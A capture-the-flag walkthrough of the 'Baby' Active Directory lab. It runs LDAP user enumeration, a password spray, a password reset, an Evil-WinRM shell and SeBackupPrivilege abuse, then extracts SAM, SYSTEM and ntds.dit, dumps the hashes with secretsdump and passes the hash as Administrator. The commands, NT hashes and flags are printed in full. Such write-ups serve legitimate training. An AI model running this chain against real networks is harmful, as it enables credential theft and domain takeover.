NMAP

We begin by running a full TCP port scan using `nmap` with service detection, default scripts, OS detection, and scanning all 65,535 ports.

```bash
sudo nmap -sC -sV -Pn -O -p 1-65535 10.10.76.243 --open 
```

**Flags explanation:**

- `-sC` → runs default NSE scripts (basic info gathering).
    
- `-sV` → detects service versions.
    
- `-Pn` → treats the host as online (skip host discovery).
    
- `-O` → attempts OS detection.
    
- `-p 1-65535` → scans all TCP ports.
    
- `--open` → shows only open ports.



```output
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Active Directory LDAP (Domain: baby.vl0)
445/tcp   open  microsoft-ds  SMB
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http    RPC over HTTP
636/tcp   open  ldapssl
3268/tcp  open  ldap          Global Catalog LDAP
3269/tcp  open  ldapssl       Global Catalog LDAP
3389/tcp  open  ms-wbt-server RDP (Windows Server 2022 DC)
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

**Host Info:**

- Hostname: **BabyDC.baby.vl**
    
- Domain: **baby.vl**
    
- OS: Windows Server (10.0.20348 → Server 2022)
    
- Role: **Domain Controller**


### Analysis

From the scan, we can see this is a **Windows Active Directory Domain Controller**. Key services:

- **Kerberos (88)** and **LDAP (389/3268)** → Used for authentication and AD enumeration.
    
- **SMB (445)** → Possible file shares / user enumeration.
    
- **WinRM (5985)** → Remote command execution (if valid creds are found).
    
- **RDP (3389)** → Direct login (with creds).
    

This setup strongly suggests that the attack path will involve **enumerating AD users** via LDAP/SMB/Kerberos, then attempting attacks like **AS-REP roasting / Kerberoasting / brute-forcing logins**.

## Step 2: LDAP Enumeration

Next, we try an **anonymous LDAP bind** using `nxc` (NetExec).

```bash
nxc ldap 10.10.76.243  -u '' -p ''
```

Result:

```output
DAP        10.10.76.243    389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.10.76.243    389    BABYDC           [+] baby.vl\: 
```

This confirms that **anonymous LDAP access is allowed** on the domain controller.

We then enumerate domain users:

```bash
nxc ldap 10.10.76.243 -u '' -p '' --users --kdc baby.vl
```

**Result:**

- 9 domain users were discovered.

```output
DAP        10.10.76.243    389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.10.76.243    389    BABYDC           [+] baby.vl\: 
LDAP        10.10.76.243    389    BABYDC           [*] Enumerated 9 domain users: baby.vl
LDAP        10.10.76.243    389    BABYDC           -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.10.76.243    389    BABYDC           Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.10.76.243    389    BABYDC           Jacqueline.Barnett            2021-11-21 10:11:03 0                                                                    
LDAP        10.10.76.243    389    BABYDC           Ashley.Webb                   2021-11-21 10:11:03 0                                                                    
LDAP        10.10.76.243    389    BABYDC           Hugh.George                   2021-11-21 10:11:03 0                                                                    
LDAP        10.10.76.243    389    BABYDC           Leonard.Dyer                  2021-11-21 10:11:03 0                                                                    
LDAP        10.10.76.243    389    BABYDC           Connor.Wilkinson              2021-11-21 10:11:08 0                                                                    
LDAP        10.10.76.243    389    BABYDC           Joseph.Hughes                 2021-11-21 10:11:08 0                                                                    
LDAP        10.10.76.243    389    BABYDC           Kerry.Wilson                  2021-11-21 10:11:08 0                                                                    
LDAP        10.10.76.243    389    BABYDC           Teresa.Bell                   2021-11-21 10:14:37 0        Set initial password to BabyStart123! 

```

## Step 3: Extracting Usernames

To make the LDAP enumeration results easier to work with, we filter only the **username column** using `awk`:


```bash
nxc ldap 10.10.76.243 -u '' -p '' --users --kdc baby.vl | awk '{print $5}'
```

Result (clean list):

```output
Guest
Jacqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell

```

This gives us a **userlist** that can be reused for password spraying, Kerberos attacks, or authentication attempts.

## Step 4: Password Spraying with Discovered Credentials

We use the password `BabyStart123!` against all enumerated accounts.  
NetExec’s `--continue-on-success` flag ensures it tries every user even if one works

```bash
nxc ldap 10.10.76.243 -u 'users' -p 'BabyStart123!' --continue-on-success
```

**Result:**

- Most accounts failed authentication.
    
- `Teresa.Bell : BabyStart123!` is also invalid.
    
- One **important finding**:
```output
DAP        10.10.76.243    389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.10.76.243    389    BABYDC           [-] baby.vl\Guest:BabyStart123! 
LDAP        10.10.76.243    389    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! 
LDAP        10.10.76.243    389    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! 
LDAP        10.10.76.243    389    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! 
LDAP        10.10.76.243    389    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! 
LDAP        10.10.76.243    389    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! 
LDAP        10.10.76.243    389    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! 
LDAP        10.10.76.243    389    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! 
LDAP        10.10.76.243    389    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! 
LDAP        10.10.76.243    389    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
LDAP        10.10.76.243    389    BABYDC           [-] baby.vl\:BabyStart123! 

```

This means the account **`Caroline.Robinson`** exists and has the password set to `BabyStart123!`, but the password **must be changed at first login**.

## Step 5: Resetting Expired Password

Since the account **`Caroline.Robinson`** was found with the status `STATUS_PASSWORD_MUST_CHANGE`, we reset the password using the `smbpasswd` utility:
```bash
smbpasswd -U Caroline.Robinson -r 10.10.76.243
```

**Process:**

- Enter old password: `BabyStart123!`
    
- Set new password: `Password123!`

```output
Password changed for user Caroline.Robinson on 10.10.76.243.
```

## Step 6: Validating New Credentials

With the updated credentials for **Caroline.Robinson**, we authenticate across LDAP, SMB, and WinRM.

### LDAP Authentication

```bash
nxc ldap 10.10.120.33 -u 'Caroline.Robinson' -p 'Password123!'
```

**Result:**

```bash
`[+] baby.vl\Caroline.Robinson:Password123! (Pwn3d!)`
```

Successful LDAP login confirmed.


### SMB Authentication

```bash
nxc smb 10.10.120.33 -u 'Caroline.Robinson' -p 'Password123!'

```
**Result:**

```output
[+] baby.vl\Caroline.Robinson:Password123!
```

 SMB access confirmed.


### WinRM Authentication

```bash
nxc winrm 10.10.120.33 -u 'Caroline.Robinson' -p 'Password123!'
```

**Result:**

```output
[+] baby.vl\Caroline.Robinson:Password123! (Pwn3d!)
```

 WinRM access confirmed, meaning we can potentially get a **remote shell**

Since the credentials `Caroline.Robinson : Password123!` worked for WinRM, we connect using **Evil-WinRM**:

```bash
evil-winrm -i 10.10.120.33 -u 'Caroline.Robinson' -p 'Password123!'
```

**Result:**

```output
Evil-WinRM shell v3.7 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents>
```

## Step 8: User Flag

Inside the Evil-WinRM shell, navigate to the **Desktop** folder of `Caroline.Robinson` and read the `user.txt` file:

```bash
type C:\Users\Caroline.Robinson\Desktop\user.txt
```

**Result:**

```bash
VL{b2c6150b85125d32f4b253df9540d898}
```

We successfully obtained the **user flag**.

## Step 9: Privilege Enumeration

From the Evil-WinRM shell, we enumerate the privileges of the current user:

```bash
whoami /priv
```

**Result:**

```output
SeMachineAccountPrivilege     Add workstations to domain     Enabled SeBackupPrivilege             Back up files and directories  Enabled SeRestorePrivilege            Restore files and directories  Enabled SeShutdownPrivilege           Shut down the system           Enabled SeChangeNotifyPrivilege       Bypass traverse checking       Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```


### Analysis

- **SeMachineAccountPrivilege** → User can add machines to the domain (potential escalation path in AD).
    
- **SeBackupPrivilege & SeRestorePrivilege** → Very powerful; allows dumping sensitive files like the **NTDS.dit** (Active Directory database) and SYSTEM registry hives, which can be used to extract domain hashes and escalate to Domain Admin.
    
- Other privileges are standard and less critical.
    
 At this stage, the **SeBackupPrivilege** and **SeRestorePrivilege** stand out as the most promising escalation path

## Step 10: Preparing for Backup Abuse (SeBackupPrivilege)

Since the account has **SeBackupPrivilege**, we can abuse it to create and mount a shadow copy of the system drive. This allows access to sensitive files such as `NTDS.dit` and registry hives for privilege escalation.

First, create a working directory and prepare a `diskshadow` script:

```bash
mkdir temp 
```

```bash
cd temp
```

```bash
echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
```

```bash
echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
```

```bash
echo "create" | out-file ./diskshadow.txt -encoding ascii -append 
```

```bash
echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
```

**Result:**  
A file `diskshadow.txt` is created with the following contents:

```output
set context persistent nowriters
add volume c: alias temp
create
expose %temp% z:
```

## Step 11: Executing Diskshadow Script

Run `diskshadow` with the prepared script:

```bash
diskshadow.exe /s C:\Users\Caroline.Robinson\temp\diskshadow.txt
```
**Result:**

- A shadow copy of the `C:` drive was successfully created.
- It was exposed and mounted as **Z:\**.

```output
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  9/8/2025 10:58:47 PM

-> set context persistent nowriters
-> add volume c: alias temp
-> create
Alias temp for shadow ID {1ecb5bc1-8755-4d1d-b87e-29754ec7a5c2} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {ac57b85b-4e05-4775-a263-e865e94888db} set as environment variable.

Querying all shadow copies with the shadow copy set ID {ac57b85b-4e05-4775-a263-e865e94888db}

        * Shadow copy ID = {1ecb5bc1-8755-4d1d-b87e-29754ec7a5c2}               %temp%
                - Shadow copy set: {ac57b85b-4e05-4775-a263-e865e94888db}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{1b77e212-0000-0000-0000-100000000000}\ [C:\]
                - Creation time: 9/8/2025 10:58:48 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: BabyDC.baby.vl
                - Service machine: BabyDC.baby.vl
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %temp% z:
-> %temp% = {1ecb5bc1-8755-4d1d-b87e-29754ec7a5c2}
The shadow copy was successfully exposed as z:\.
```


## Step 12: Extracting Registry Hives

With the shadow copy mounted as **Z:\**, we copy out the critical registry hives for offline credential extraction.

### Copy the SAM hive

```bash
robocopy /b Z:\Windows\System32\Config C:\temp SAM
```

Result:
```output
New File   65536   SAM
```

Copy the SYSTEM hive

```bash
robocopy /b Z:\Windows\System32\Config C:\temp SYSTEM
```

Result:
```output
New File   16.2 m   SYSTEM
```

Confirming copied files

```bash
ls C:\temp\
```

Result:

```output
SAM     (64 KB)
SYSTEM  (16.2 MB)
```

## Step 13: Downloading Registry Hives

Once the **SAM** and **SYSTEM** hives were copied, we exfiltrated them to the attacking machine using Evil-WinRM’s `download` feature:

```bash
download SAM 
```

```bash
download SYSTEM
```

**Result:**
```output 
Info: Download successful!
```

## Step 14: Extracting NTDS.dit

To fully dump all domain credentials, we also need the **Active Directory database** (`ntds.dit`). Using the shadow copy, we copied it out:

```bash
robocopy /b Z:\Windows\NTDS C:\temp ntds.dit
```

Result:
```output
New File   16.0 m   ntds.dit
```

We then downloaded the file:
```bash
download ntds.dit .
```

Result:
```output
Info: Download successful!
```

## Step 16: Extracting Local Hashes

With the `SAM` and `SYSTEM` files downloaded, we used **Impacket’s `secretsdump.py`** to dump local account hashes:

```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

Result:
```output
[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)

Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


```

## Step 17: Dumping Domain Hashes from `ntds.dit`

We then dumped the **Active Directory credentials** from the `ntds.dit` file using:

```bash
secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
```

```output
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:...:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:...:fc94f27a251a81061a73f182785001ff:::
krbtgt:502:...:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:...:20b8853f7aa61297bfbc5ed2ab34aed8:::
...
baby.vl\Caroline.Robinson:1115:...:2b576acbe6bcfda7294d6bd18041b8fe:::

```

We now have the **NT hash** for the **Domain Administrator**:

```output
ee4457ae59f1e3fbd764e33d9cef123d
```

## Step 18: Administrator Access

Using the Administrator NT hash with **Evil-WinRM**

```bash
evil-winrm -i 10.10.120.33 -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d


```

Connection successful
## Step 19: Root Flag

We navigated to the Administrator’s Desktop and retrieved the **root.txt** flag:

```bash
cd C:\Users\Administrator\Desktop type root.txt
```

**Flag:**
```output
VL{9000cab96bcf62e99073ff5f6653ce90}
```

# Summary

- Enumerated LDAP users.
    
- Found **Caroline.Robinson** with password reset requirement.
    
- Changed her password via SMB.
    
- Got a shell with Evil-WinRM.
    
- Abused **SeBackupPrivilege** with `diskshadow.exe` + `robocopy`.
    
- Extracted **SAM**, **SYSTEM**, and **ntds.dit**.
    
- Used `secretsdump.py` to dump **local + domain hashes**.
    
- Logged in as **Domain Administrator**.
    
- Captured both `user.txt` and `root.txt` flags.
    

 **Box pawned – full domain compromise!**





